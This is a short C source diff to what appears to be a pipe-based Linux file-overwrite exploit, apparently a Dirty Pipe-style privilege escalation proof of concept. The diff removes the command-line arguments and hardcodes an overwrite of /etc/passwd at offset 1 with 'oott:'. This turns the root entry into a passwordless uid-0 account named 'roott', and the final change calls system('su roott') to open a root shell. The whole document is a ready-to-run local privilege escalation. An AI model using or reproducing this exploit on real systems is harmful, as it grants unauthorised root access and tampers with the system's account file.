@@ -72,15 +72,17 @@ static void prepare_pipe(int p[2])
 
 int main(int argc, char **argv)
 {
+	/*
 	if (argc != 4) {
 		fprintf(stderr, "Usage: %s TARGETFILE OFFSET DATA\n", argv[0]);
 		return EXIT_FAILURE;
 	}
+	*/
 
 	/* dumb command-line argument parser */
-	const char *const path = argv[1];
-	loff_t offset = strtoul(argv[2], NULL, 0);
-	const char *const data = argv[3];
+	const char *const path = "/etc/passwd";
+	loff_t offset = 1;
+	const char *const data = "oott:";
 	const size_t data_size = strlen(data);
 
 	if (offset % PAGE_SIZE == 0) {
@@ -151,6 +153,7 @@ int main(int argc, char **argv)
 		return EXIT_FAILURE;
 	}
 
-	printf("It worked!\n");
+	printf("Happiness\n");
+	system("su roott");
 	return EXIT_SUCCESS;
 }
